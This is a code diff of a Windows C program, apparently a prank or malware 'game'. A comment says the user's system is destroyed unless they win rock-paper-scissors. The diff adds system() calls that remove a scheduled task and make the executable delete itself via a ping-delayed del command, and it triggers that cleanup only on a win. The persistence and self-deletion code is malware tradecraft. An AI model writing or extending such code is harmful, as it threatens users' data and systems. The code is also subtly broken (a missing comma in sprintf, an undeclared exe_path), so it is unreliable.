@@ -80,8 +80,10 @@ void task_sch() {
 }
 // so if you win your system isnt destroyed
 void safe() {
+    // rm scheduled tsk
     char cmd[256];
     sprintf(cmd, "schtasks /delete /tn \"%s\" /f" rand_nm);
+    system(cmd);
     
     //delete itself
     //uses localhost as a delay method 
@@ -89,7 +91,8 @@ void safe() {
     GetModuleFileNameA(NULL, cmd, MAX_PATH);
     char rm_cmd[MAX_PATH + 128];
     sprintf(rm_cmd,
-    "cmd /c ping 127.0.0.1 -n 2 > nul && del \"%s\"", cmd);
+        "cmd /c ping 127.0.0.1 -n 2 > nul && del \"%s\"", exe_path);
+    system(rm_cmd);
 }
 void game() {
     SetConsoleTitleA("Screen");
@@ -113,13 +116,14 @@ void game() {
             printf("1, 2 or 3!!!\n invalid input ");
             continue;
         }
-    break; // valid input 
+        break; // valid input 
     }
 
 	int rps = play - robot;
 	printf("robot chose %s\n", dict[robot]);
 	if ((rps > 0 && rps != -2) || rps == -2) {
         printf("you won!\n");
+        safe();
     } else if (rps == -1 || rps == 0) {
         printf("you lost :(\n");
     }
